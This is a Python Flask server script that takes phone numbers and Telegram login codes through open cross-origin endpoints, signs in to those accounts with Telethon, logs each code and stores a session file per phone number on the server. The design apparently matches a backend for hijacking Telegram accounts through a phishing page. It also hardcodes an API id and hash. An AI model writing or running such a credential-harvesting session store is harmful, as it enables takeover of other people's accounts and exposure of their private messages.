from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError
import os
import asyncio

app = Flask(__name__)
CORS(app)

api_id = 9348118
api_hash = 'b6e1802b599d8f4fb8716fcd912f20f2'
pending_auth = {}

def run_async(func, *args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(func(*args))
    except Exception as e:
        return {'status': 'error', 'message': str(e)}
    finally:
        loop.close()

async def auth_phone(phone, code=None):
    try:
        client = TelegramClient(f'session_{phone}', api_id, api_hash)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'status': 'success', 'message': 'Session exists'}
        
        if not code:
            sent = await client.send_code_request(phone)
            pending_auth[phone] = sent.phone_code_hash
            return {'status': 'code_required', 'message': 'Code sent'}
        else:
            if phone not in pending_auth:
                return {'status': 'error', 'message': 'No auth pending'}
            
            await client.sign_in(phone=phone, code=code, phone_code_hash=pending_auth[phone])
            me = await client.get_me()
            await client.disconnect()
            return {'status': 'success', 'message': f'Session for {me.first_name}'}
            
    except Exception as e:
        return {'status': 'error', 'message': str(e)}

@app.route('/request-code', methods=['POST'])
def request_code():
    data = request.json
    phone = data.get('phone', '').strip()
    if not phone.startswith('+'): phone = '+' + phone
    print(f"📱 Phone: {phone}")
    return jsonify(run_async(auth_phone, phone))

@app.route('/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    if not phone.startswith('+'): phone = '+' + phone
    print(f"🔐 Code for {phone}: {code}")
    return jsonify(run_async(auth_phone, phone, code))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
